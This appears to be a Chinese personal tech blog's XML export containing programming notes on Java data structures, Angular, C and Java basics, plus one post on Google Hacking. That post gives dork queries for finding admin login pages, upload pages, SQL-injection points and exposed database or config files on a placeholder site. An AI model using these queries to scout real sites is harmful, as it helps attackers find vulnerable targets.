    <content type="text"><![CDATA[队列和栈 队列是FIFO(先进先出)的数据结构,可用于排队问题,优先级问题等. 栈是LIFO(后进先出)的数据结构.可用于表达式求值,递归问题等. Java实现 动态调整数组大小的下压(LOFO)栈. 12345678910111213141516171819202122232425262728293031323334import java.util.Iterator;public class ResizingArrayStack&lt;Item&gt; implements Iterator&lt;Item&gt; &#123; private Item[] a = (Item[]) new Object[1]; private int N = 0; public boolean isEmpty() &#123; return N == 0; &#125; public int size() &#123; return N; &#125; private void resize(int max) &#123; Item[] temp = (Item[]) new Object[max]; for (int i = 0; i &lt; N; i++) &#123; temp[i] = a[i]; &#125; a = temp; &#125; public void push(Item item) &#123; if (N == a.length) resize(2 * a.length); a[N++] = item; &#125; public Item pop() &#123; Item item = a[--N]; a[N] = null; if (N &gt; 0 &amp;&amp; N == a.length / 4) resize(a.length / 2); return item; &#125; public Iterator&lt;Item&gt; iterator() &#123; return new ReverseArrayIterator(); &#125; private class ReverseArrayIterator implements Iterator&lt;Item&gt; &#123; private int i = N; public boolean hasNext() &#123; return i &gt; 0; &#125; public Item next() &#123; return a[--i]; &#125; public remove() &#123;&#125; &#125;&#125; 基于链表的先进先出(FIFO)队列. 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.util.Iterator;public class Queue&lt;Item&gt; implements Iterator&lt;Item&gt; &#123; private Node first; private Node last; private int N; private class Node &#123; Item item; Node next; &#125; public boolean isEmpty() &#123; return first == null; &#125; public int size() &#123; return N; &#125; public void enqueue(Item item) &#123; Node oldlast = last; last = new Node(); last.item = item; last.next = null; if (isEmpty()) first = last; else oldlast.next = last; N++; &#125; public Item dequeue() &#123; Item item = first.item; first = first.next; if (isEmpty()) last = null; N--; return item; &#125; public Iterator&lt;Item&gt; iterator() &#123; return new ListIterator(); &#125; private class ListIterator implements Iterator&lt;Item&gt; &#123; private Node current = first; public boolean hasNext() &#123; return current != null; &#125; public void remove() &#123;&#125; public Item next() &#123; Item item = current.item; current = current.next; return item; &#125; &#125;&#125;]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>data-structure</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-develop-FrontEnd-Angular-基础]]></title>
    <url>%2Fposts%2F4a24836c%2F</url>
    <content type="text"><![CDATA[开发环境 node.js,angular-cli,chrome(或其他浏览器). 重要文件 通过修改package.json文件中的dependencies字段然后npm install来安装对应软件包,或者直接npm install &lt;package name&gt;来安装软件包. package.json文件中的devDependencies用于指定开发过程用到的包,scripts用于定义用来编译,测试或运行的命令. 通过修改.angular-cli.json文件中的style字段来配置CSS文件. index.html就是整个Angular网页.Angular是单页面应用程序.还有引导文件project/src/main.ts. 模块与组件 JavaScript模块用于管理项目中不同文件之间产生的依赖关系,使用模块时每个TypeScript或JavaScript文件被认为是一个独立的功能单元,并且使用export来表示要在其他单元使用的数据或类型. Angular通过模板来展示数据,即包含由Angular执行的指令的HTML片段.例如使用,Angular会对表达式expr求值. Angular组件负责管理模板并为其提供数据和业务逻辑.一个组件大致如下所示: 123456789101112import &#123; Component &#125; from "@angular/core";//...//装饰器,提供类的元数据.@Component(&#123; selector: "todo-app",//CSS选择器,相当于div这个标识符对于div元素 templateUrl: "app.component.html"//用于指定当前组件对应的模板 //...&#125;)export class AppComponent &#123; //...&#125; Angular模块和JavaScript模块是不一样的,Angular模块用于描述应用程序或一组相关功能,每个应用程序都有一个根模块,它为Angular提供启动应用程序的信息. 123456789import ...@NgModule(&#123; declarations: [AppComponent],//声明组件 imports: [...],//导入相应的模块 providers: [],//声明服务 bootstrap: [AppConponent]//指定用于启动应用程序的组件&#125;)export class AppModule &#123; &#125; Angular为了知道根模块,还需要一个引导文件project/src/main.ts. 1234567import ...if (environment.production) &#123;//产品环境下 enableProdMode();&#125;platformBrowserDynamic().bootstrapModule(AppModule) .catch(err =&gt; console.log(err)); Angular通过服务来分离那些多个组件复用的数据与业务逻辑. JavaScript模块 Angular中的JavaScript模块可以使用插值表达式. 12&lt;h1&gt;Hello &#123;&#123;name&#125;&#125;&lt;/h1&gt;&lt;!-- name为对于组件里的变量 --&gt; 还可以使用事件绑定来触发对应组件内的函数. 1&lt;date-picker (dateChanged)="statement()"&gt;&lt;/date-picker&gt; 对于Http请求可以使用内置的HttpClientModule模块. 12345678910import &#123; HttpClientModule &#125; from '@angular/common/http';//...imports: [..., HttpModule],//...//...this.http.get&lt;Member[]&gt;("https://api.github.com/orgs/angular/members? page=1&amp;per_page=5").subscribe(data =&gt; &#123; if (data) this.members = data;&#125;); 指令 Angular指令用于在模板中处理数据的展示.常用的有ngFor,ngIf等等.作为元素的属性使用. 123456789101112&lt;h2&gt;大家好，我是&#123;&#123;name&#125;&#125;&lt;/h2&gt;&lt;p&gt;我来自&lt;strong&gt;&#123;&#123;address.province&#125;&#125;&lt;/strong&gt;省, &lt;strong&gt;&#123;&#123;address.city&#125;&#125;&lt;/strong&gt;市&lt;/p&gt;&lt;div *ngIf="showSkills"&gt; &lt;h3&gt;我的技能&lt;/h3&gt; &lt;ul&gt; &lt;li *ngFor="let skill of skills"&gt; &#123;&#123;skill&#125;&#125; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 具体使用参考官方文档.开发资源. 路由 首先通过Angular模块来配置路由信息. 12345678910111213141516import &#123; Routes, RouterModule &#125; from '@angular/router';import &#123; UserComponent &#125; from './user.component';export const ROUTES: Routes = [ &#123; path: 'user', component: UserComponent &#125;];@NgModule(&#123; imports: [ BrowserModule, RouterModule.forRoot(ROUTES) ], // ...&#125;)export class AppModule &#123;&#125; 然后可以通过多种方式进行路由. 1234&lt;a routerLink="/user"&gt;user&lt;/a&gt;&lt;!-- 路由到对应路径 --&gt;&lt;router-outlet&gt;&lt;/router-outlet&gt;&lt;!-- 根据url进行路由 --&gt;]]></content>
      <categories>
        <category>CS</category>
        <category>develop</category>
      </categories>
      <tags>
        <tag>FrontEnd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-IG-GoogleHacking]]></title>
    <url>%2Fposts%2F55bfba0c%2F</url>
    <content type="text"><![CDATA[概念 利用Google的特定语法来查找网站可能的敏感网页与漏洞. 基本Google Hacking语法 一些操作符 给关键词加上双引号实现精确搜索,不进行分词. 通配符是星号*,必须在精确搜索符双引号内部使用. 点号.匹配的是字符,不是字,短语等内容. Google和许多搜索引擎一样,多个词间的逻辑关系默认的是逻辑与(空格). 使用|进行逻辑或,使用-进行逻辑非,使用+进行强制搜索,(即必须包含加号后的内容). 用两个点号..表示一个数字范围. intext 以网页的正文内容做为搜索条件,但只能接一个关键字. allintext 和intext类似,能接多个关键字,能与其他操作符混用. intitle 以网页的标题内容做为搜索条件,但只能接一个关键字. allintitle 和intitle类似,能接多个关键字,不能与其他操作符混用. cache 输入URL,搜索特定页面的缓存快照. define 搜索输入关键词或关键词组的定义来源链接. filetype/ext 搜索指定类型的文件. info 输入URL,搜索其摘要和相关信息,不能与其他操作符及关键字混用. inurl 搜索关键字是否存在于URL中.可以结合site指令来找后台,可以与其他操作符混用. allinurl 类似inurl,但是可指定多个字符,不能与其他操作符混用,可单独使用. link 搜索链接到所输入URL的页面,不需要关键字,不能与其他操作符及关键字混用. site 将搜索范围缩小到特定的网站,域或子域. tips:不加www可以搜索到二级域名. related 输入URL,搜索与该URL相关的页面,不能与其他操作符及关键字混用. numrange 冒号后接数字范围,用-两边接数字来表示. inanchor 搜索一个HTML标记中的一个链接文本. 组合使用 找管理后台地址 123site:xxx.com intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号site:xxx.com inurl:login/admin/manage/manager/admin_login/login_admin/system/boss/mastersite:xxx.com intitle:管理|后台|登陆| 找上传一类的漏洞 12site:xxx.com inurl:filesite:xxx.com inurl:load 找注入点页面 1site:xxx.com inurl:php?id= 找编辑器页面 12site:xxxx.com inurl:fcksite:xxx.com inurl:ewebeditor 找特定文件 123456site:xxx.com inurl:robots.txtsite:xxx.com filetype:mdbsite:xxx.com filetype:inisite:xxx.com inurl:txtsite:xxx.com filetype:phpsite:xxx.com filetype:asp]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>information-gathering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-NOTES-C专家编程-笔记]]></title>
    <url>%2Fposts%2Fda9895fa%2F</url>
    <content type="text"><![CDATA[tips 参数的传递过程就是赋值,其约束条件也是如此. const关键字并不真正表示常量. 链接时-lthread等同于libthread.so. 预处理器 C语言预处理器主要实现三个功能,字符串替换(#define str_a str_b),头文件包含(#include &lt;stdio.h&gt;)和宏扩展(#define a(y) a_do(y)). C标准未定义行为 整型数右移要不要扩展符号位. 参数求值的顺序. 优先级与结合性之外的计算顺序,包括表达式中函数求值顺序. 缺省可见性 C语言函数定义时是缺省下全局可见的,这种大范围的全局可见与C语言另一个特性interpositioning相互影响,在C语言中一个符号要么全局可见,要么对其他文件都不可见. 容易误解的运算符优先性 .优先性高于*,所以*p.f相当于*(p.f)而不是(*p).f. []优先性高于*,所以int * ap[]声明的是一个数组,存储类型为int指针. 算术运算优先性高于移位运算. 逗号运算符优先级最低. maximal munch strategy 这是一个编译策略,即如果下一个标记有超过一种的解释方案,编译器将选取最长字符序列的方案. 声明 C中的声明包括至少一个类型说明符,有且只有一个的声明器(直接声明器,如name,name[N],name(arg,...)等),,连接的零个或更多声明器(指针),和零个或一个的初始化内容组成. 类型说明符包括存储类型(原生基础类型和聚合类型)和类型限定符(例如:auto,const等). 声明说明了其他地方创建的对象名称并允许使用.定义是一种特殊的声明,它还创建了一个对象. 优先级规则 声明从标识符开始读取,然后按照优先级顺序读取. 声明中被括号括起来的那部分. 后缀操作符(),[]. 前缀操作符*. 如果const,volatile后面紧跟类型说明符,那么它作用于类型说明符.其他情况下作用于左边紧邻的指针星号. C名称空间 C存在多种名称空间 标签名(goto). 标签(tag):用于所有的结构,枚举和联合. 成员名:每个结构或联合都有自己的名称空间. 其他. 例如:struct foo{ int foo; }foo;是合法的. 隐式转换 对于大多数C语言的实现,处理同样字长的有符号数和无符号数之间相互转换的一般规则是:数值可能会变,但位模式不变.对于不同字长的数据类型之间的转换,C语言标准要求先转换大小再转换有无符号.对应的就可能会产生截断.所有比int小的整型计算时都会升级成int进行计算. 而当执行一个运算时,如果一个有符号一个无符号,C语言会隐式地将有符号数强制类型转换为无符号数. C语言中的移位运算和大小转换涉及到无符号扩展和符号扩展,还有对应的截断. 在C语言中当float和double转换成int时溢出会产生整数不确定值(在Intel兼容的微处理器中即0x10000...). 数组与指针 C语言引入了可修改的左值这个术语,即允许出现在赋值语句的左边的左值. 12x = y;//x为左值,y为右值 左值在编译时可知,表示存储数据(结果)的地址.而对应的右值表示存储的数据内容.数组名是左值但不是可修改的左值. 当一个数组名出现在一个表达式时,它会被转换为一个指向该数组第一个元素的指针. C语言将数组下标作为指针的偏移量. 作为函数参数的数组名等同于指针. 编译器为每个变量分配一个地址(左值),而这个变量的内容(右值)是运行时才可知的. 数组名并不是指针,其使用过程并不相同. 12char a[5] = "1234";a[3]; 这里对a[3]的访问过程为: 从符号表获得变量数组a的地址(左值),加上3. 取结果地址的内容(右值). 12char * a = "1234";a[3]; 这里对a[3]的访问过程为: 从符号表获得变量指针a的地址(左值),获取其内容(右值,指向字符串). 将获取内容与3相加,去结果地址内容(右值). 前者直接访问数据,后者要通过指针内容(地址)间接访问. 运行时数据结构 段,heap,stack,libc等. 全局的goto与标签--setjmp与longjmp. 指定初始化 源于ISO C99标准. 1234567891011static struct usb_driver usb_storage_driver = &#123; .owner = THIS_MODULE, .name = "usb-storage", .probe = storage_probe, .disconnect = storage_disconnect, .id_table = storage_usb_ids,&#125;;int a[6] = &#123;[4] = 29, [2] = 15&#125;;int widths[] = &#123;[0 ... 9] = 1, [10 ... 99] = 2, [100] = 3&#125;;//GNU扩展]]></content>
      <categories>
        <category>CS</category>
        <category>NOTES</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-develop-java-基础]]></title>
    <url>%2Fposts%2Fffd96d81%2F</url>
    <content type="text"><![CDATA[基础 1234567public class Sample &#123; //类名以大写字母开头 public static void main(String[] args) &#123; System.out.println("233"); //我是一个注释 &#125;&#125; 1234javac Sample.java#注意文件名一定要与公共类名一致,且一个源文件中只能有一个公共类java Sample#调用Sample类的main方法,也可以调用该文件中其他类的main方法 public为访问修饰符,表示对所有类可见,使用对象为类,接口,变量,方法. class用于声明一个类,在Java中类是程序内容的唯一容器(面向对象编程),类名首字母必须大写.源代码文件名必须与公共类的名字相同,且一个源文件中只能有一个公有类. static表示方法为静态方法,静态方法只能访问静态成员,而实例方法可以访问静态和实例成员.void表示该方法无返回值. 在Java中main方法必须声明为public static void main(String[]),String[]中就是命令行参数(与C和C++不一样的是其中不包括程序名). 注释 12345//用于注释一行/* 注释其之间的所有字符,不能嵌套 *//** * 可以用来自动生成文档 */ 数据类型 4种整型类型:long,int,short,byte.分别为8,4,2,1个字节. 而整数字面量有长整型数值4000L;十六进制数值0x16,0XAA;八进制数值010;二进制数0b101,0B100;还可以加下划线1_000_000,其中下划线会被Java编译器忽略;和普通的233; 其中和C和C++不一样的是Java整型类型的大小与平台无关,且没有无符号整型.但Java用&gt;&gt;代表算术右移运算,&gt;&gt;&gt;代表逻辑右移运算. 2种浮点类型:float,double.分别为4,8个字节.前者有效位数为6~7位,后者为15位. 浮点字面量有float的3.1F,3.2f;double的3.1D,3.2d,4.0. 整型上溢和下溢会产生类似时钟的结果,而浮点数溢出或者出错会产生正无穷大,负无穷大和NaN,其中NaN不是唯一的.判断结果是否为NaN不能使用x == Double.NaN,而是使用Double.isNaN(x);整数除以0会产生异常,而浮点数会得到无穷大或者NaN. char类型原本用于表示单个字符,由于字符集的扩展和Unicode编码机制有些字符需要两个char值,一般不使用char类型. boolean类型有两个值:true和false,用于判断逻辑条件,与C和C++不一样的是Java种布尔值不等同于整型值,比如if(0){}无法通过编译. 还有枚举类型,字符串.Java没有内置的字符串类型,而是在标准库提供了String,每个用双引号括起来的字符串都是String类的一个实例. 变量 每一个变量都有自己的类型和值,Java不区分变量的声明和定义(C和C++区分). Java中使用final关键字指示常量(类似C和C++中的const,表示只能初始化一次,在Java中const是保留的关键字). 运算符 关于%运算,Java同C和C++有同一个结果,就是余数与被除数同号. 而变量计算时的隐式类型转换同有符号数的C和C++(Java)没有无符号整数.tips:不要对boolean类型进行强制类型转换. Java关于移位运算有一个专门的&gt;&gt;&gt;代表逻辑右移(自然&gt;&gt;就是算术右移).其他的与C和C++基本相同. Java不使用逗号运算符,不过可以在for的第一和第三部分使用逗号,分隔表达式列表. String类对象是不可变字符串,编译器让字符串共享,这符合设计模式中的享元模式. Java中的对象和C和C++中的引用类似.String类变量实际在引用一个String类实例(就像指针),Java不保证所有一个字符串只存在一个被共享,所以检测一个字符串是否相等应该使用equals.而不是使用==(因为这是在比较引用的对象是否是一个). Java中null和空串是不同的,前者表示引用为空,后者表示引用的对象是空串. Java对数组的声明和对象类似,需要new来创建数组,数字数组元素初始化为0,boolean数组元素初始化为false,对象数组元素初始化为null(Java中运行数组长度为0).如果使用{1,2,3}来初始化数组对象则不需要显示的使用new. 同时Java的数组变量也是引用,且可以赋值. Java数组与C和C++分配在堆上的数组指针基本一样.同理double [][] a = new double[6][10]声明的是一个包含6个指针的数组,而a是指向它的指针(实际上Java并没有提供对指针的操作,也没有指针这个概念). 基础输入输出 标准输出可以使用System.out对象的方法实现,而读取标准输入需要先构造一个Scanner对象并与System.in关联.然后调用相应方法即可.Scanner类定义在java.util包中. 1Scanner in = new Scanner(System.in); 读写文件需要借助类PrintWriter. 12Scanner in = new Scanner("1.txt", "UTF-8");PrintWriter out = new PrintWriter("1.txt", "UTF-8") 面向过程编程 Java控制流程的结构与C和C++基本一样,但Java没有goto语句,用于替代跳出多重循环的是带标签的break和带标签的continue(只能跳出,不能跳入). 另外还有一个类似C#中foreach循环的for循环,也叫for each循环. 1for(type arg:args) &#123;&#125; Java中有块作用域(与C和C++不一样,Java不允许嵌套定义),即一个变量的生命周期和可见范围为声明到当前块结束. 包 Java使用包将类组织起来.对编译器来说,嵌套的包没有任何关系. 一个类可以使用所属包的所有类,以及其他包的公有类. 可以通过import来引用包含在包中的类(import static导入静态方法与静态域),从而简化引用.或者显式的写出包名(还可以导入静态方法,静态域或其他特定的方法或域). 通过package &lt;packageName&gt;来将一个类放入包中. 类与对象 类是构造对象的模板,由类构造对象的过程称为创建类的实例.用Java编写的所有代码都位于某个类的内部. 对象中的数据称为实例域,操纵数据的过程称为方法.类和对象是封装的体现. 在Java中所有的类都源自一个Object超类,通过扩展一个类建立另一个类的过程称为继承. 使用构造器(特殊的方法)构造对象的实例,通过声明变量并赋值引用来使用对象的实例. 注意,变量不是对象,未初始化的变量也没有引用任何对象.局部变量不会自动的初始化为null. Java的变量可以看作C++的对象指针. 访问控制符 public:对任何类的任何方法可见. private:只有本类的方法可以访问. proteced:对所有子类(包括本类)及同一个包中的所有其他类都可见.(C++中没有包这个概念,只对本类及所有子类可见) 默认:对本包可见. 构造器 构造器与类同名,没有返回类型(其实是返回类的实例).类可以有一个及以上的构造器.构造器总是伴随new操作符使用(C++中为单独使用). 隐式参数this 类的非静态方法都有一个隐式参数,即调用这个方法的类的实例,可以使用this参数访问该实例的数据,也可以直接用实例域的标识符访问. C++和Java的方法都可以访问所属类的私有特性,而不限于隐式参数的私有特性. 传参 Java分两种参数类型,基本数据类型和对象引用,Java参数为传值调用. final域 final修饰符指明该实例域构建对象时必须初始化这个域且之后不能更改(同C++的const).大多应用于基本类型域. 静态域和静态方法 一个类的静态域有且只有一个(普通实例域每个类都有一个自己的备份). 静态方法不能操作对象(因为静态方法并没有自己所属的对象),但可以访问自己的静态域. 这两者使用static声明,解释为:属于类且不属于类对象的函数和变量. 可以使用静态工厂方法来生成不同风格的格式化对象,静态方法的调用不需要对象实例. 重载 在同一名称空间使用相同的名字,不同的参数的多个方法就产生了重载.(所以完整描述一个方法需要指出方法名字和参数类型,称为函数的签名) 初始化 如果没有在构造器显式的给域赋初值,那么域会被初始化为默认值:0,false,null(这一点与局部变量不同). 当类没有提供构造器时,系统会提供一个默认的无参构造器. Java还可以显式域初始化(C++11也行),例如:private int id = 1;. 与实例域同名的参数会屏蔽实例域. 如果构造器的第一个语句形如this(...),这个构造器将会调用同一个类的另一个构造器(类似功能在C++11中使用委托构造函数实现). 除了在构造器初始化或者使用显式域初始化,Java支持初始化块这一机制. 12345678910class A&#123; //实例域 &#123; //初始化块内容 &#125; //其他&#125; 而当调用构造器时,具体初始化步骤如下: 所有数据域被默认初始化. 按照类声明的次序,依次执行所有域初始化语句和初始化块. 执行构造器主体或调用第二个构造器并返回此步. finalize方法 Java有自动的垃圾回收器,所有不需要析构器.但可以为类添加finalize方法,其会在垃圾回收器清除对象前调用(但具体调用时间未知). 对象包装器 Java为每个基本类型设计了一个对应的final类,Integer,Long,Float,Double,Short,Byte,Character,Void,Boolean(前六个类派生于公共超类Number). 而且Java对其支持自动装箱机制,如下(注意包装器类不能实现修改数值参数,因为这种对象是不可变的). 1234Integer n = 3;//编译器会将其变为:Integer n = Integer.valueOf(3);int a = n;//编译器会将其变为:int a = n.intValue(); 超类与子类 is-a(是)关系是继承的一个明显特征.在Java中子类(也称派生类或孩子类)继承于超类(也称基类或父类),使用关键字extends(C++为:)表示继承. 对比C++,Java所有的继承都是公有继承,没有私有和保护继承. 子类会继承父类的方法和域,可以通过super.func()调用超类的方法(注意super并不是引用,只是告诉编译器这里要调用超类的方法,C++中使用超类名加上::操作符). 通过重新定义函数来覆盖超类的方法(注意需要参数类型,函数名一致,类似C++中虚函数的覆盖,也可以说Java方法默认为虚函数,如果不想被子类覆盖可使用final标记方法,或者直接标记类使类的方法自动变成final,不包括域). 超类引用可以引用子类对象,可以使用super(arg1, ...)调用超类的构造器(C++中使用初始化列表语法). 虚函数使一个对象变量可以在运行时能够自动地选择调用哪个方法,这种现象称为动态绑定.而一个对象变量可以指示多种实际类型的现象称为多态. 方法调用 对于类X的对象x的方法调用x.f(args).调用过程如下. 编译器首先查看对象声明类型,方法名和方法参数类型等找到要调用的函数的函数签名. 如果为private方法,static方法,final方法或者构造器则此时就可以确定调用的方法.这种调用方式称为静态绑定. 如果不是,则从当前类开始,沿继承链向超类寻找这个方法调用.实际上Java虚拟机会为每一个类创建一个方法表(虚函数表)以供动态调用. 强制类型转换 可以通过instanceof操作符查看是否能进行类型转换. 12345if (x instanceof Master)&#123; x2 = (Master) x; ...&#125; 实际上的类型转换只能在继承层次内发生,并且超类转换成子类之前需要使用instanceof检测(类似C++的dynamic_cast). 抽象类 可以使用abstract声明抽象方法与抽象类,包含与一个或多个抽象方法的类本身必须被声明为抽象的. 抽象方法相当于一个占位符,其具体实现在子类中.抽象类不能被实例化.C++通过在类的一个成员函数声明尾部用= 0标记声明其为纯虚函数来声明这个类为抽象类. Object Object类为Java所有类的始祖,类声明时如果没有明确指出超类,则此类的超类为Object.(在Java中只有基本类型不是对象) Object提供了以下11个方法. 12345678910111213141516171819202122232425262728293031323334353637public final native Class&lt;?&gt; getClass()//getClass方法是一个final方法,并且也是一个native方法.//返回当前运行时对象的Class对象.public native int hashCode()//hashCode方法是一个native方法.//返回对象的哈希码,主要使用在哈希表中.//哈希码的通用约定如下:在同一java程序执行过程中,在一个对象没有被改变的前提下,hashCode方法都会返回相同的整数值;如果2个对象使用equals方法进行比较相同的话,那么这2个对象的hashCode的值也必须相等;如果equals方法得到两个对象不相等,不相等的对象的hashCode值不同的话可以提高哈希表的性能;public boolean equals(Object obj)//比较两个对象是否相等.Object类的默认实现,即比较2个对象的内存地址是否相等.//equals方法在非空对象引用上的特性://自反性,任何非空引用值x,对于x.equals(x)必须返回true;//对称性,任何非空引用值x和y,如果x.equals(y)为true,那么y.equals(x)也必须为true;//传递性,任何非空引用值x,y和z,如果x.equals(y)为true并且y.equals(z)为true,那么x.equals(z)也必定为true;//一致性,任何非空引用值x和y,多次调用x.equals(y)始终返回true或始终返回false,前提是对象equals比较中所用的信息没有被修改;//对于任何非空引用值x,x.equals(null)都应返回false;protected native Object clone() throws CloneNotSupportedException//clone方法是一个protected的native方法.//创建并返回当前对象的一份拷贝.一般情况下,对于任何对象x,表达式x.clone() != x为true,x.clone().getClass() == x.getClass()也为true.//由于Object本身没有实现Cloneable接口,所以不重写clone方法并且进行调用的话会发生CloneNotSupportedException异常.public String toString()//Object对象的默认实现,即输出类的名字@实例的哈希码的16进制.//建议Object所有的子类都重写这个方法.protected void finalize() throws Throwable &#123; &#125;//finalize方法是一个protected方法,Object类的默认实现是不进行任何操作.//该方法的作用是实例被垃圾回收器回收的时候触发的操作.类似C++的析构函数.public final native void notify()public final native void notifyAll()public final native void wait(long timeout) throws InterruptedExceptionpublic final void wait(long timeout, int nanos) throws InterruptedExceptionpublic final void wait() throws InterruptedException//都是关于线程的,后面再解释. 反射 Java中通过反射库实现了一个反射机制,能够在运行时分析类的能力和查看对象,实现通用的数组操作代码,利用Method对象(类似C++的函数指针). Class类 这是Java运行时为所有对象维护的一个保存类型信息的类Class.通过getClass()方法获得实例. 异常捕获 类似C++的异常处理机制. 12345try &#123; //&#125; catch (Exception e) &#123; //&#125; 分析类 反射机制能在运行时检查类的结构.通过java.lang.reflect包中的三个类Field,Method和Constructor来描述类的域,方法和构造器.对应接口为Class类中的getFields,getMethods,getConstructors,getDeclareFields,getDeclareMethods,getDeclareConstructors. 调用任意方法 Java中没有提供函数指针之类的东西,但可以通过反射机制调用任意方法.Method类中有一个invoke方法允许调用包装在当前Method对象中的方法. 1Object invoke(Object obj, Object... args) 通过对应的Class类的getMethod方法获取对应的Method实例. 12Method a = Sample.Class.getMethod("getName", double.class)//第一个参数为方法名,后面为方法每个参数的参数类型 继承的设计技巧 将公共操作和域放到超类. 不要使用受保护的域. 使用继承实现is-a关系. 除非所有继承的方法都有意义,否则不要使用继承. 在覆盖方法时,不要改变预期的行为. 使用多态而非类型信息. 不要过多的使用反射. 接口 在Java中接口是对类的一组需求描述.如果类遵从某个特定接口,就履行这项服务. 接口中所有方法自动属于public,且可以被扩展. 接口有除函数原型外对方法作用的要求. 接口不能有实例域,但可以有常量(接口的域自动设为public static final).在Java SE 8前不能在接口中实现方法,之后可以实现静态方法(实际使用中常用伴随类代替). 接口不能实例化,但是可以声明变量,同时可以用instanceof检测一个对象是否实现了某个接口. 接口的定义. 123public interface Comparable&lt;T&gt; &#123; int compareTo(T other);&#125; 接口的默认实现. 1234public interface Comparable&lt;T&gt; &#123; default int compareTo(T other) &#123; /* code */ &#125; //必要的关键字default&#125; 类实现接口(实现时必须把方法显式声明为public),一个类可以实现多个接口,用逗号,分隔. 12345Class MyTest implements Comparable&lt;MyTest&gt; &#123; public int compareTo(MyTest other) &#123; //code &#125;&#125; 如果接口的默认方法与超类或另一个接口中定义的方法冲突,按照以下规则处理. 超类优先. 接口冲突(至少一个接口提供了默认实现,就会发生冲突)则必须覆盖方法. 示例 Cloneable接口,该接口的默认实现为浅拷贝,有时候程序的情景需要深拷贝. 12345678class MyTest implements Cloneable &#123; public MyTest clone() throws CloneNotSupportedException &#123; MyTest cloned = (MyTest) super.clone(); cloned.day = (Date) day.clone(); return cloned; &#125;&#125; lambda表达式 lambda表达式是一个可传递的代码块和必须传入代码的变量(就像参数)规范,可供之后执行.lambda表达式无需指定返回类型,lambda表达式的返回类型总是会由上下文推导得出(所以要合理返回). 123456(String first, String second) -&gt; first.length() - second.length()//等同于(first, second) -&gt; first.length() - second.length()() -&gt; &#123; System.out.println("hello"); &#125;//即使没有参数仍然要提供空括号event -&gt; System.out.println(event);//如果可以推导出参数类型,则可以忽略参数类型,且如果此时只有一个参数,可以省略小括号 lambda表达式与接口兼容,对于只有一个抽象方法的接口,需要该接口的对象时可以提供一个lambda表达式,这种接口称为函数式接口.或者可以直接方法引用代替. 12Timer t = new Timer(1000, System.out::println);//System.out::println等价于x -&gt; System.out.println(x) 构造器引用与方法引用类似,只不过方法名为new,例如:Person::new,Person[]::new. lambda表达式包括三个部分:一个代码块,参数,自由变量的值(非参数而且不在代码中定义的最终变量,即初始化后不会再赋值),表示lambda表达式得数据结构必须存储自由变量的值.这种代码块存储自由变量的值的情况叫做闭包. lambda表达式的体与嵌套块有相同的作用域,所以不能定义同名的变量.lambda表达式中的this关键字是指创建这个lambda表达式的方法的this参数. 内部类 内部类是定义在另一个类中的类,内部类方法可以访问该类定义所在的作用域中的数据,包括私有数据;内部类对同一个包的其他类是不可见的.非static内部类的对象有一个隐式引用,其引用了实例化该内部对象的外围类对象(与C++中嵌套类的主要区别). 内部类是一种编译器现象,与虚拟机无关,编译器会将内部类翻译成:外部类名$内部类名.类似于方法重载的本质. Java还支持在方法中定义局部内部类,其作用域为当前块.同时局部内部类还可以访问当前块的final局部变量,其原理是局部内部类会在局部变量释放前将其备份一次. Java还支持匿名内部类,匿名内部类没有类名,所以不能有构造器,如果构造参数的小括号后跟一个大括号,正在定义的就是匿名内部类. Java还支持静态内部类,只有内部类可以声明为static,静态内部类除了没有对外围类的引用权外与其他内部类一样. 异常处理 Java的异常处理与C++的十分类似,都是由发生错误的方法抛出异常,然后异常处理机制捕获异常并使用对应的异常处理器处理异常. 异常分类 在Java中异常对象都是派生于Throwable类的实例,同时支持创建自己的异常类. 所有异常都是由Throwable继承而来,Throwable有两个子类:Error和Exception. Error类及其派生类描述了Java运行时系统的内部错误和资源耗尽错误.应用程序不应该抛出这种错误. Exception又分两种:RuntimeException和其他异常.前者及其派生类用于描述程序错误导致的异常,后者及其派生类描述如IO错误导致的异常(即不属于Error和Exception范围的,也称为受查异常). 程序开发者导致的问题都属于RuntimeException负责的范围,也就是说自己创建的类应该派生于Exception或其子类.同时异常类应该包含两个构造器,一个无参的默认构造器,一个带有描述信息的构造器. 123456class MyException extends IOException &#123; public MyException() &#123;&#125; public MyException(String gripe) &#123; super(gripe); &#125;&#125; 编译器将核查是否所有受查异常都提供了异常处理器. 声明并抛出受查异常 方法需要告诉编译器所有可能抛出的受查异常,子类方法中声明的受查异常不能比超类方法中的更通用. 123456public FileInputStream(String name) throws FileNotFoundException, EOFException &#123; //.. if (b &lt; len) &#123; throw new EOFException(); &#125;&#125; 捕获异常 如果抛出的异常未被捕获则程序会终止执行并打印异常信息,包括异常的类型和堆栈内容(图形化程序捕获异常后也会打印堆栈信息). Java中通过try/catch语句块捕获异常. 1234567891011121314try &#123; //code&#125; catch (EOFException e) &#123; //code&#125; catch (MyException e) &#123; //可捕获多种异常 //code&#125; catch (MyException1 | MyException2 e) &#123; //Java SE 7后支持,区别在于这样两种异常共用一个异常处理块 //code&#125; finally &#123; //无论try语句中是否发生异常(即使try中已经返回)都会执行finally中的语句,常用于回收资源 //code&#125; 如果异常类型不对未被捕获,则函数会终止并返回(控制权交给调用者函数,看调用者函数是否处理该种异常).异常处理代码中可再次抛出异常. 断言 断言机制允许在测试期间在代码中插入一些检查语句,当代码发布时这些语句会被自动移走. 1234assert x &gt;= 0;//assert 条件;assert x &gt;= 0 : x;//assert 条件 : 表达式; 如果条件判断为false则会抛出一个AssertionError异常,若有表达式则表达式会被传入AssertionError的构造器. 断言机制默认关闭,通过运行时-ea或-enableassertions选项来对某个类或包启用该机制,-da/-disableassertions选项来对某个类或包禁用该机制(对于系统类使用-esa/-dsa选项). 1java -ea Sample 泛型类示例 Java通过通配符类型来设计一个泛型类或者泛型方法. 123456789101112131415161718public class MyTest&lt;T&gt; &#123; private T a; public MyTest() &#123; a = null; &#125; //code&#125;//codeMyTest&lt;String&gt; a = new MyTest&lt;String&gt;;//codepublic class MyTest2 &#123; //code public static 